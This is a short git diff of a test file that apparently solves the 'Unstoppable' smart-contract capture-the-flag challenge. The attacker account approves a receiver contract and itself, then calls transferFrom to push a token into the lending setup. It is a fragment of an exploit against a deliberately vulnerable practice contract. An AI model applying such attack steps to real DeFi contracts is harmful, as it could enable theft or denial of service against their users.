@@ -51,7 +51,9 @@ describe('[Challenge] Unstoppable', function () {
         const approveResult = await this.token.connect(attacker).approve(brokenReceiverContract.address, TOKENS_IN_POOL);
         console.log("allowance: ", (await this.token.allowance(attacker.address, brokenReceiverContract.address)).toString());
 
-        // const result = await this.token.connect(attacker).transferFrom(attacker.address, brokenReceiverContract.address, 1);
+        // Can also approve yourself to send your own tokens
+        await this.token.connect(attacker).approve(attacker.address, TOKENS_IN_POOL);
+        const result = await this.token.connect(attacker).transferFrom(attacker.address, brokenReceiverContract.address, 1);
         // const result = await this.token.transferFrom(attacker.address, brokenReceiverContract.address, 1);
         // console.log("result: ", result);
 
